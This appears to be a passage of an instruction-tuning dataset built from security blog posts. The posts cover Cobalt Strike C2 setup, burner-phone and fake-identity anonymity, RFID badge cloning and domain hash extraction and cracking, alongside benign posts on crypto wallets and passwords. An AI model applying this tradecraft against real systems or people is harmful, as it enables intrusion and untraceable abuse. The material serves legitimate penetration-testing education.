sure it's all working as expected After connecting my Cobalt Strike client to all the active team servers I add the eventlog-to-slack.cna Aggressor script and enter the appropriate settings This integration can be confirmed in the appropriate Slack channel Next I created two listeners One on the HTTP host which is also set to have its beacons call back to the HTTP redirector The second on the HTTPS listener which is straight connection back to it no redirection On the payload host I hosted a PowerShell web delivery script which stages to the HTTP host which will be proxied through the redirector After executing the PowerShell payload on a victim machine everything successfully stages through the redirector and access is obtained via the HTTP host By tailing the Apache logs on the redirector we can also see the redirector in action Finally I'm spawning a new beacon from the access we have on the HTTP host to call back to the HTTPS host Great Looks like everything is now fully operational and we also have our Slack notifications of new beacons that came in Global Firewall Lastly I wanted to come back to the doctl utility mentioned at the very beginning This is a CLI tool installed locally on your physical host but doesn't have to be that allows you to access and configure nearly every option that Digital Ocean provides What I had in mind for this was to use the Digital Ocean firewall feature to create a firewall that restricts access to and from the entire infrastructure One reason for this is to set up rules that allow only you and your customers for example to touch the infrastructure When you first run doctl you'll need to authenticate using your API key After that all the options are now available In the image above you can see how with a few commands you can query various information from your Digital Ocean account Let's create a firewall that we will then apply to all droplets The idea here is to demonstrate how you can restrict traffic not only to and from your instances but also between them should the need arise In the above image I'm creating a demo firewall called c2-infra-firewall and defining the inbound and outbound rules For the inbound you would want to change the 0.0.0.0 0 to your originating IP and perhaps the IP address es that could originate from who you are testing A few other advantages of restricting traffic to such a degree would be if your target is on a different network than the blue team Also restricting internet noise and potential unwanted visitors from touching your C2 Once you've created the firewall you can list it and its settings and start adding droplets to it globally You'll just need the firewall ID and droplet IDs as seen in the above image These setting are also reflected in your Digital Ocean control panel Closing Thoughts and Mentions Before wrapping up this post a few thoughts on the design above From an OPSEC perspective hosting your entire C2 on a single provider can prove problematic should the entire range for Digital Ocean get blocked Also regarding OPSEC having all your C2 traffic call to a single domain is not great either Mix it up and spread it out The eventlog-to-slack Aggressor script may not be something you or your customers are happy with if certain and potentially sensitive information is posted to Slack Take this into consideration There's been some Twitter debates lately regarding attack infrastructure on cloud VPS and systems you will not actually have true control over and the ethics of this It's a valid point and something to consider so be sure you and your customers are aware of the how and where their data will be protected C2K is far from a finished project There's many new additions I'm still working on adding such as DNS team servers and redirectors more defensive settings and phishing instance with SMTP relay automation I'd like to give some special thanks to those who have authored the tools I've integrated into C2K as well as some people who have influenced me a lot and helpful resources Killswitch_GUI for lterm and HTTPsC2DoneRight.sh bluscreenofjeff for creating the Red Team Infrastructure Wiki BlackHills Infosec staff for allowing me to post on their awesome blog armitagehacker for Cobalt Strike Thank you all so much for reading and happy hacking _________ Lee Kagan is a guest blogger from RedBlack Security He is an offensive security professional with almost a decade in IT and InfoSec A penetration tester red teamer and currently lead for RedBlack Security's Rogue Team specializing in threat and adversary emulation in Toronto Canada Lee's focus on the team and in practice is offensive infrastructure support post-exploitation of Windows and Active Directory environments PowerShell and C weaponization"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Non-Attrib Starterpack!</title>\n<taxonomies>Author, External/Internal, Jordan Drysdale, Phishing, Red Team, Burner Devices, Digital Ocean, Jordan Drysdale, non-attrib, privacy, Red Team, Tracfone</taxonomies>\n<creation_date>Mon, 26 Mar 2018 15:37:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Let's start this post at Walmart Yes the visit may be attributable against the purchaser via security camera footage retrieved by warrant so hand your wife husband confidant whomever a stack of untraceable cash The first thing to snag is a new burner phone This one seems acceptable for our purposes Wait though did we define our purposes Do we need to Are we hiding from a tyrannical regime Check Are we hiding from ad networks trying to group us under demographic profiles that allow injected web responses hijacked through advanced techniques and directed marketing Check Are we trying to hide from a customer contractual engagement where attribution is a goal of their SOC Check If you happen to be interested in any of these things this write-up might be for you The next purchase item is an activation card The data inclusion is important because you may need a hotspot in a pinch for internet access The last physical purchase item will be your Visa gift cards small denomination 25 works well because Digital Ocean's costs are low A server is around five bucks a month for a lightweight one with minimal hardware these make perfect tunnel proxy servers Next up head to your favorite local coffee shop and order something Wear a hoodie because it is required or not Jump on the wireless from your burnable laptop Seriously perma-cookies are easy to track If you have used this laptop for anything associated with you your new non-attrib accounts are hosed Check out tracfone.com they will allow new fone activations without an account You may be concerned that the coffee shop could be attributable and it might be McDonald's has this weird thing where their backbone connections may drop you out of one their primary datacenters You could get lucky there too and not even be on your local city carrier networks The first account required will be a new email account for activation and two-factor purposes Google's mail product Gmail if you will is a fantastic platform If you haven't seen this product I recommend checking it out At this point you also need to consider where on earth you want your new identity to reside Another interesting note here is that the ad-networks behave differently depending on where you purchase your Digital Ocean node For example you do not have access direct access to Axiom BeenVerified and various other human data aggregators in the European Union because of their privacy laws Either way head over Fake Name Generator This site will give you a pre-packaged identity for non-attributable use Next let's head over to Paypal because the lovely people at Paypal will process payments 3 for you against your prepaid Visa gift cards You will need a new account your Gmail account logged in for verification and your gift cards in hand Last on my must-have list for the non-attribution starterpack is a Digital Ocean account They will allow you to deploy servers in London Singapore Amsterdam Toronto et cetera Guess what Now with your coffee shop wi-fi connection you can disappear Be sure your browser is configured for a proxy With the standard SSH tunnel command you can drop on to the internet wherever your node was deployed ssh -D 9999 -fCqNp 8228 user fqdn.tld D local listening socket the other flags are some SSH magic and the -p is your remote SSH port Did I mention GoDaddy allows domain purchases via non-attrib No They do though this is a bit advanced for the starterpack Cheers and safe transit ______ Follow Jordan on Twitter rev10d"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Hard Part of the Alphabet</title>\n<taxonomies>Fun & Games, BHIS, Black Hills Information Security</taxonomies>\n<creation_date>Thu, 29 Mar 2018 15:19:06 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melisa Wachs Many of you have met John so I thought you'd enjoy this posh little gem I dug up This picture was taken in our first home and although I don't remember this very moment I do have a fond memory from around this time that many of y'all may be able to relate Our mother Rita was not just kind and gentle but also firm Family bonds were important and she often reminded us that the longest relationship you'll ever have is with your siblings not even your spouse or children It's a gift so cherish and foster it This reminder usually came after we had normal childhood squabbles So the eve of my first day of Kindergarten when John took an unorthodox approach to preparing me for school she allowed the chaos and mess that accompanied my lesson for the sake of building a relationship In essence John turned our entire main level of the house into a giant obstacle course Every movement through the course was not just a physical challenge but an intellectual one as well If I wasn't able to properly complete the intellectual aspect I had to start the physical component over For example I remember counting to 20 while weaving over and under the kitchen chairs as they lined the hall My admitted weakness though was the dreaded ..l m n o p section of the ABC's He was grueling Imagine doing cartwheels on the couch then jumping off the end arm while trying to focus on which letter was next 26 times It was tiring It was frustrating I remember being very dizzy But I also remember the distinct look on his face and feeling of accomplishment when I finally made it John is a natural teacher He understood even then how to make things stick I'm so glad our mother knew when a memory was more important than a mess that she always encouraged us to stick close Other people might cringe at having their siblings and family members work alongside them but not John We may have our disagreements from time to time but at the end of the day I continue to look up to him and admire all that he's done We hope you have a very blessed Easter with your families"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Intro to Cryptocurrency and How to Secure Your Coins</title>\n<taxonomies>Author, Beau Bullock, How-To, Informational, Bitcoin, cryptocurrencies, Cryptocurrency, cryptocurrency wallet</taxonomies>\n<creation_date>Tue, 03 Apr 2018 15:06:17 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Overview This blog post is meant to serve as a basic introduction to the world of cryptocurrencies With cryptocurrencies making their way into mainstream news outlets I am getting asked more and more about it People that I had mentioned Bitcoin to back in 2013 are coming out of the woodwork to ask about it now that it's getting so much attention This blog is going to cover how to get your first coins and how to securely store them Disclaimer I am not a financial advisor and this is not financial advice Do your own research before buying cryptocurrency Possibly two of the most important aspects of cryptocurrencies are that there are many different ones and that not all of them are in fact meant to be currencies As of today March 27 2018 coinmarketcap.com lists 1 589 different cryptocurrencies A large number of these coins are meant to improve on current monetary systems Bitcoin being at the forefront has dominated the market but there are plenty of others that are attempting to achieve a similar goal Litecoin Ethereum and Ripple are each similar in that they are attempting to solve global issues with the transfer of money Many of the other coins and tokens have very different goals and technologies backing them though Many people who are jumping into cryptocurrency are mainly doing so because of the speculative nature of it and they are hoping to make some gains off of investment I think that there is definitely potential for monetary gains but more importantly there is potential for technological gains Specifically 'blockchain is the underlying piece of technology that Bitcoin and other cryptocurrencies are running on top of More on the blockchain in another post let's get to the part where we buy some coins Join an Exchange and Purchase Coins Coinbase by far is the most popular exchange used by many of those just getting into cryptocurrency At the present date you can sign up on Coinbase and buy either Bitcoin Ethereum Litecoin or Bitcoin Cash with a debit card or bank transfer If you are looking to quickly jump into cryptocurrency I'd recommend signing up here and buying your first coins One thing to keep in mind is that for all cryptocurrencies you don't have to buy them in whole number format meaning you can buy very small fractions of each coin For example you don't have to buy one 1 Bitcoin to own Bitcoin You can purchase Bitcoin out to the eighth decimal place like this 0.00000001 BTC Fun fact 0.00000001 BTC is referred to as 1 Satoshi This means that if you want to buy 20 worth of Bitcoin you can How you became interested in cryptocurrency can drive what coins you wish to purchase Bitcoin has recently had very high transaction fees along with long wait times for transacting coins making it not the best for quick payments If you are interested in the using cryptocurrency as a daily-use payment method you might be more inclined to acquire something like Ethereum or Litecoin instead of Bitcoin since their fees are lower and are relatively fast If you are interested in maintaining anonymity and are more privacy focused then coins such as Monero ZCash or Verge are for you These coins will require you signing up on a different exchange such as Binance to trade Bitcoin or Ethereum for these If you are more interested in a store of value Bitcoin might be the choice for you as it has historically been the center of the cryptocurrency world When Bitcoin price rises so do others when it drops everything else does Secure Your Coins Rule 1 of cryptocurrency is Don't leave your coins on an exchange Ok so what does that mean Coinbase is a web application This means that your private keys are controlled by them Private keys are exactly what they sound like They are the digital equivalent to the key to your bank account If Coinbase gets hacked all your coins will be stolen Exchanges have been hacked before and will again Look at Mt Gox Blackwallet Bitthumb Coincheck etc There are a number of ways to store cryptocurrency in a manner where your private keys are not controlled by someone else You can install a piece of software on a computer you control you can store them in what's called a hardware wallet and it's even possible to store them on a piece of paper Here is some information about some various ways to store cryptocurrency Software Wallet You can download and install a piece of software on a computer you control to interact with your wallet For example for Bitcoin there is Bitcoin Core software This is what is known as a full node meaning that it downloads the entire blockchain to your system and operates as a node on the Bitcoin network Having your wallet local to your computer system using the Bitcoin Core wallet means that your private keys are in your control and not on a third-party exchange The main problem though is that this requires a lot of storage space for the blockchain currently over 145 GB Another issue with storing coins on a computer locally is that the computer you store them on is still potentially vulnerable to being hacked If you choose to use this method I recommend using a completely separate computer that is used for nothing other than to sync the blockchain and make transactions This will limit your exposure to malware that could potentially steal your wallet Additionally make sure you encrypt your wallet with a strong passphrase that way in the event your wallet file is stolen it limits the possibility for an attacker to steal your coins This can easily be done via the interface in Bitcoin Core Lastly if you choose to use this method make sure you backup your wallet file Use an external drive to store your backed up wallet file offline in a secure location Keep in mind that the Bitcoin Core wallet only stores Bitcoin cryptocurrency For other coins you would have to locate their full node software and perform a similar setup for each one Hardware Wallets Another method of storing your cryptocurrency is to use what is known as a hardware wallet Hardware wallets are specially designed devices that store private keys on them The private keys are meant to be kept on the devices alone and never touch a computer's disk thereby limiting the risk of malware affecting them There are two primary vendors of hardware wallets today Ledger and Trezor Ledger wallets and Trezor wallets are hardware devices that allow you to store your private keys on a device other than your computer Each of these devices allow you to create a pin for accessing your wallets on the device In order to interact with your coins both of these devices still require a piece of software in order to interact with your wallets This could be in the form of a Chrome extension or desktop software The devices are supposed to be able to validate the software is legitimate but there have been some issues with vulnerabilities here Each of these devices create a 24-word backup seed when you initially set them up This seed is used to recover your wallets in the event that your device is lost or stolen You could write down your seed or you could opt for something a bit more solid so that in the event of a fire your seed isn't destroyed These devices aren't perfect but are much less susceptible to malware attacks than if you were to store your wallet on your computer One important thing to note is that if you are going to purchase a hardware wallet make sure you are purchasing it direct from the vendor and not from a reseller on Ebay or Amazon This helps limit your exposure to what is known as a supply-chain attack Paper Wallets Another option for storing your coins is to use what is called a paper wallet Essentially a paper wallet is your private key printed out on paper in QR code form This prevents the wallet's private key from being stored digitally in any manner A paper wallet can be generated using a site like itcoinpaperwallet.com After generating the wallet you could transfer your coins to it thereby storing your coins offline in what is known as a cold wallet There has been debate about whether this option is actually more secure than using a hardware wallet or not due to the fact you still have to generate the keys on a computer that is potentially prone to malware If you decide to go this route I'd recommend performing the following actions in order to minimize risk of having your private keys stolen Boot a computer from a USB using a Linux operating system such as Ubuntu Don't use the web version of the Bitcoin paper wallet generator Instead download the offline wallet generator ithub.com cantonbecker bitcoinpaperwallet Disconnect from any network Generate your paper wallet Print it out Conclusion Securing cryptocurrency is a vastly important area and will continue to grow in the near future Myself Mike Felch Steve Borosh and Ralph May do a weekly podcast called the CoinSec Podcast that is meant to address security issues in cryptocurrencies and blockchain technologies If you are interested in the security aspects of cryptocurrency be sure to check out the CoinSec Podcast You can also follow us on Twitter at CoinSecPodcast to get all the latest cryptocurrency security news"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>An Open Letter about Big All-Powerful Company's Password Policy</title>\n<taxonomies>Informational, bad passwords, long passwords, password policy, passwords</taxonomies>\n<creation_date>Thu, 19 Apr 2018 15:09:33 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kelsey Bellew Dear Big All-Powerful Company Your idea of a 'strong password is flawed When I first saw the following message I laughed I said out loud No you have not seen that password before ever I guarantee it but I moved on I thought no big deal I'll add some length And then adding length didn't work You're telling me you've seen the password I thought up just now with a character length of THIRTY-SEVEN characters and a complexity of four too many times Really More length OH YOU HAVE HAVE YOU Are you flagging dictionary words You have to be flagging dictionary words What is your password policy even So at least eight characters complexity of three check Big All-Powerful Company why You don't allow Spring18 under the condition of 'We've seen that password too many times before but Spr1ng18 is fine huh And then I found out you're not flagging ALL dictionary words just months and your company name maybe when I looked at password policy in the Change Password page There I was told that my password needed to be at least eight characters a complexity of three and oh look no longer than 16 characters You mean to tell me that you consider a password that doesn't fit within the bounds your text box is both 'too long and 'weak Really For anyone who has a similar misconception please review the following Also here are a couple blog posts we've written that go further into depth as to why allowing passwords like Spr1ng18 is a bad idea and how to create better passwords How to Increase the Minimum Character Password Length 15 Policies in Active Directory 10 Ways to Protect Your Online Digital Life"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>New Toy Alert: A Quick Review of Keysy</title>\n<taxonomies>Fun & Games, Informational, Physical, Keysy, Physical Pentest, Physical Pentesting, RFID, tools</taxonomies>\n<creation_date>Thu, 05 Apr 2018 15:47:46 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Rick Wisser Here at BHIS we are always on the lookout for new toys Especially if we can use them during a pentest As a pentester we all have a complimentary tool set in our jump bags that we have grown accustomed to using Tools such as the Rubber Ducky Konboot Lan Turtle proxmark3 crowbar try getting that past TSA etc are utilized in certain capacities depending on the situation we find ourselves in during a physical assessment Like a group of little kids when we find something exciting we share it with everyone and of course everyone wants one as well I was chatting with Brian Fehrman several mouths back and he was telling me about this new Kickstarter campaign called Keysy by TINYLABS I immediately went and checked it out and ended up backing the project Keysy is described as a device that can store replay and clone RFID key cards and key fobs from one device I had actually forgot about it until I received them earlier this week Therefore lets do a quick review blog post about it When I signed up to back the project I choose the 40.00 option at the time and by doing so I would receive two devices The devices came packaged together in one box and each had their own retail like packaging Packaging Front and Back I noticed that on the back of the packaging it states that the device is compatible with most 125kHz RFID Therefore this device will work only with Low Frequency RFID cards High Ultra High and Microwave Frequency cards operate at higher frequencies Here is a breakdown of the types of cards and their frequencies Low Frequency LF 120-1355 KHz HID Prox EM Nedap NeXS High Frequency HF 13.56MHz MIFARE Classic DESfire HID iCLASS Legic Ultra High Frequency UHF 860-980 MHz RAIN RFID EPC Gen 2 Microwave 2.45 GHz Nedap TRANSIT Included in each package was the Keysy device along with instructions a note and a rewritable RFID fob Contents of Keysy Package The note reads Due to inconsistencies between different RFID readers as well as the small geometry of the Keysy antenna it is not possible for Keysy tag emulation to work with every reader Keysy tag emulation as been tested and works well with the majority of commercial readers In the cases where Keysy emulation doesn't work Keysy and the included rewritable RFID tag can still be used to make a duplicate copy of the original tag Please see instructions for additional information on cloning tags Using Keysy I followed the instructions by first trying to read an iCLASS card into Keysy As I had expected the card was not able to be read by Keysy This is because iCLASS cards operate at a frequency outside of Keysy's intended use iCLASS Card Read Failure I then grabbed my local recreation center card which is a HID Prox card and attempted to read that with the Keysy device HID Prox Card Successful Read The card was read successfully with the indication of the green light The instructions also stated that to confirm you got a successful capture you can push the button on the remote and a the green LED should turn on I did as instructed and got the green LED The following are observations that I found during reading the card with the Keysy device To copy an RFID card into the device you have to have Keysy in very close proximity to the card I tested to see how far Keysy could be away from the card to get a successful read By my observations I had to hold Keysy within an inch of the card to get a successful read It takes about 17 to 20 seconds to read the RFID card I also successfully wrote the captured data to the included RFID fob The instructions said to hold Keysy against the fob and press the button that I programmed the card into 5 times sequentially The clone was found to be successful by observing the Keysy LED flash three times Keysy Write to Key Fob Successful Keysy Angle to Reader Now it was time to try it out at my local recreation center First I attempted to use the Keysy to replay the RFID card and found that it was successful I had to play with it a little to point it in the sweet spot of the reader I found that it worked best if you held it at a slight angle as shown below I then utilized the cloned key fob and found that it worked just as a regular card would I could definitely see this being utilized during a pentest to capture or clone a card but due to how close you must be and the time it takes to read the card it might not fit every situation as other devices might Evaluating this device from a blue team prospective I can see issues with individuals being able to clone or make copies of their cards I have listed them below Someone clones the card for a friend and also is able to make a copy for themselves Someone clones their own card s and loses one of them or the original without informing the security staff Someone with access to your Keysy can make a copy if they have a writable card or fob From my testing I found Keysy to be a very cool device for what it is intended for It seems to be solid and works as advertised I could see myself using this if I had several RFID cards that were compatible In fact I will probably just utilize my RFID fob for access to my recreation center since I can just put it on my keyring I think that it might be preemptive for the personnel in charge of low-frequency building access controls to start educating employees and creating policies and procedures around duplication or RFID cards or utilization of devices like Keysy"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>What to Expect from a Vulnerability Scan</title>\n<taxonomies>Informational, Nessus, pentest, Pentesting, Vulnerability Scanning, vulnerability scans</taxonomies>\n<creation_date>Thu, 12 Apr 2018 15:53:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson For a lot of our customers their first introduction to pentesting is a vulnerability scan from BHIS This is after talking to the testers of course and setting up rules of engagement sharing which hosts are within scope and talking over how we as testers here at BHIS can best help secure their environment But still this is the first time the rubber meets the road and it can make people understandably nervous What is a scan anyway Will it crash things Do we need to run it at night or on a weekend We field a lot of these questions and this post is here to help you get an idea of why we do these scans and what you can expect Make sure you're comfortable and let's get started First an intro to vulnerability scans As you may have noticed from our new homepage redesign at ww.blackhillsinfosec.com we frequently compare penetration tests to climbing a mountain with our ultimate objective the crown jewels of an organization at the top You can climb a mountain by just walking up to it and starting of course but you're probably going to have a rough time of it frequently making it part way up before you realize you've taken a bad route climbing back down and starting over In this world a vulnerability scan is a map of the mountain not a perfect one but better than nothing Using this map the testers here at BHIS can be your adventure guides we can plan routes up make sure to fully explore the mountain find hidden crevices and caves and do it all much faster than if we were to just start climbing Here at BHIS we generally use Nessus for our scans A quick skim through the Nessus propaganda gives you some idea of why Tenable the company behind Nessus claims that over 24 000 organizations around the world use Nessus and I believe them When we launch scans we do so with a finely-tuned policy based on the PCI standard scan the same one used by thousands upon thousands of others they're called PCI standards for a reason What does this mean for you It means you're not going to have anything weird slamming your network No DoS attacks no bruteforcing passwords and so on We like to get creative in our tests but an automated vulnerability scan is not the place to do it Creativity is for humans Sorry robots I asked the testers at BHIS for their most out-there Nessus stories and got very little despite decades of cumulative experience regularly running these scans The short of it is that anything that Nessus breaks must be so fragile that you should reconsider it being on your production network at all Here's what John has to say after hundreds of tests over many years Testers please share a list of any system service that crashed in a test I will start 1 Killed a switch in 2003 2 Submitted emails Lots of emails to some open contact email page This has happened on a number of different customers It is also not specific to Nessus but to any web scanner crawler 3 Um Ahh Might be getting old I did hear a couple of stories along the lines of Well we hit the customer with a scan and they had their monitoring set up to alert on so many things that the SOC lit up like the 4th of July and the alert traffic brought down their network That's certainly bad but also if your IDS is set that aggressively I mostly feel bad for the analysts who have to sift through all that noise This is a vulnerability in itself and a good one to know about Other than that everything we know is hearsay I've heard legends of printers spewing page after page with cryptic packets printed on them rumors that anyone who reads the pages in their entirety gains eldritch networking powers are entirely unfounded or of SCADA systems crashing but nobody at BHIS has seen this firsthand The closest we got was David Fletcher who told a story of HID physical access controllers on a production network which stopped responding to the connected card readers after being scanned and needed to be rebooted It turned out though that these same controllers had default hard-coded credentials which couldn't be changed and cached the last read from each connected card reader on their web interface which allowed anyone to impersonate anyone else by just grabbing these cached scans These are the sorts of issues we see if Nessus breaks it it's a good sign that something is very very wrong We tune our Nessus scan policy to avoid these issues ignoring printers skipping SCADA systems and I want to underscore that despite decades of combined experience running these scans here at BHIS we very rarely see anything break because of a scan At the end of the day BHIS is here to help you secure the mountain that is your organization and the map generated by Nessus is a great help to us and you in doing so We can work without it but we'll be climbing blind and a lot slower because of it If you have any concerns about scanning your network just chat with your tester about it we've seen a lot and it's our job to guide you through your test whether it's your first or your hundredth"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Small and Medium Business Security Strategies: Part 4</title>\n<taxonomies>Author, Blue Team, How-To, Informational, InfoSec 101, Jordan Drysdale, Critical Controls, Jordan Drysdale, Medium Business, Security Stratigies, Small Business, Vulnerability Management</taxonomies>\n<creation_date>Thu, 26 Apr 2018 15:21:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr Vulnerability management is a part of doing business and operating on the public internet these days Include training as part of this Critical Control Users should be aware that attacks will continue to evolve and clicking links isn't the only way to get infected these days Hire a managed services provider worth their salt and let them manage these things for you CSC 3 Vulnerability Management Critical Controls The Easy Five just became the Easy Six The easy six review Hardware Inventory Software Inventory Vulnerability Management Controlled Admin Privileges Secure Configurations for Domain Systems Logging Controls So are we there yet Kinda We're actually almost half way So what is vulnerability management It depends According to SecureWorks vulnerability management is a drain on your security team What we're talking about here is a bit more nuanced than that I'll define a vulnerability under this context as an identified or published flaw that can be tested and validated using various software toolkits generally available Now let's be clear not all vulnerabilities can be identified with current scanner tools For example OWA If your company exposes Outlook Web Access to the public internet this is a vulnerability To pentesters OWA is a gold mine of potential LinkedIn profiles Twitter Facebook .if your employees are here this is also a vulnerability of sorts So with that out of the way how does a small business assess its vulnerabilities and manage them Owning and maintaining licenses for Nexpose Nessus Qualys et al .is basically out of the question This point harkens back to the use of managed service providers Bullet points for vetting a third-party service provider If you don't know you can ask someone who does Stamp of approval of some kind SSAE-16 SOC to operate securely Reasonable cost quarterly scans and directed guidance against your few IP addresses should be in the range of five thousand bucks a year or less in my opinion Let's take a step back here and ask if a managed service provider makes sense to coordinate all IT efforts at our organization The ROI of adding a managed service provider for 30 systems servers network gear vulnerability scans and a managed help desk of some kind at around 2000 2500 should make sense It is rare these days that a single human resource employee can come in to an organization and manage the complexities of even a small network Those individuals also come with the benefits and salary price tag that make the ROI of paying an MSSP much more reasonable Now your organization is ready to mobilize and actually run some vulnerability scans Companies running their first vulnerability scans whether inside or outside their networks are often surprised to hear their networks are an absolute mess Like this Under contracted efforts BHIS would gently urge customers to review the policies and procedures surrounding systems management patching and updates most specifically If you were previously under the protection of a managed IT provider it is time to pull the plug If this output is the result of their first contact with your network give their efforts another quarter Thanks for reading this far cheers For Parts 1-3 ww.blackhillsinfosec.com small-medium-business-security-strategies-part-1-introduction ww.blackhillsinfosec.com small-medium-business-security-strategies-part-2-inventory ww.blackhillsinfosec.com small-and-medium-business-security-strategies-part-3-inventory-part-2-software External Links Ref ww.cisecurity.org controls Ref ww.onlinetech.com resources references data-center-standards-cheat-sheet-from-hipaa-to-soc-2"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Got Privs? Crack Those Hashes!</title>\n<taxonomies>Author, Joff Thyer, Red Team, Red Team Tools, Crack Hashes, Joff Thyer</taxonomies>\n<creation_date>Thu, 03 May 2018 15:06:55 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer Black Hills Information Security loves performing both internal penetration tests as well as command and control testing for our customers Thanks to the efforts of many great researchers in the industry we are lucky enough to escalate privileges in many environments laterally move and demonstrate access to sensitive data As a penetration tester we must always have the mindset of demonstrating business risk as the number one goal Thus I find myself often saying things like Domain Admin in the Windows Active Directory world are not everything In fact in support of this idea there have been many occasions whereby I have managed to move laterally within an environment because of enumerated discovered local administrative privileges and even used token impersonation exclusively to mimic a normal business user with the goal of demonstrating access to data Did I need to grab that domain admin privilege for this Well not at all Do these sorts of actions scare the daylights out of business executives that are trying to guard the crown jewels You bet it does Gaining local privilege escalation is something we often achieve through any number of methods including Mis-configured service accounts Unquoted service path names Unattended installation XML files Group policy preferences XML files DLL hijacking The always elevate registry key for MSI installations Kerberoasting thank you Tim Medin Password spraying In recent tests I have found that Kerberoasting remains very fruitful but in unusual ways One attack path I have found interesting is to spray for passwords that you first discover through Kerberoasting or other local machine escalation It is amazing how many times that Systems Admins will reuse passwords and not be cognizant that password reuse across different privileged accounts is a really bad idea All that said let's just face it there is nothing better than the thrill of finally getting full domain administrative access While it does not demonstrate business risk directly it sure makes you feel a little tingle followed by your happy little got root dance Yes admit it you all have a got root dance My lovely wife always knows when I hit the jackpot because my office is next to the kitchen and I cackle loudly when it happens Ok so after you get that Domain Admin account through whatever means there are so many things you can do Among these is performing the value-added service of grabbing the full domain account hashes and letting your hashcat flag fly in all its glory Yes crack those hashes and see just what percentage of all the creds you can actually obtain In the process of doing so you will turn your rockin video GPU water-cooled cracking masterpiece into a small space heater while using about 3 000 watts of electricity over a couple of days but oh the wonderful beauty of the result Of course when you are finished you should use Carrie's Domain Password Audit Tool to produce a beautifully formatted HTML report It is not unusual to obtain figures such as over 70 of hashes cracked in any one organization Now I will get to the point extracting the hashes can be dangerous Why do you ask Well many of us in the bad old days are accustomed to using either hashdump or smart_hashdump thanks Carlos ww.darkoperator.com blog 2011 5 19 metasploit-post-module-smart_hashdump.html in the Metasploit project While these are lovely well-written pieces of software both approaches on a Domain Controller will try to extract hashes from the LSASS.EXE process Within a small environment you will probably be just fine However there are times when you are operating within an environment of 20 000 100 000 credentials or more If you muck around with LSASS.EXE in this sized environment you will likely crash a domain controller and that is sub-optimal How do we handle this situation It would be really nice if we could gain access to the NTDS.DIT SAM and SYSTEM files directly and just copy the data down This works well because the folks at Core Security have a Python script called secretsdump.py within the Impacket repository giving us the ability to grab the hashes directly from the database and registry files Next question is how on earth do we gain access to these files On a running domain controller they are locked files so you 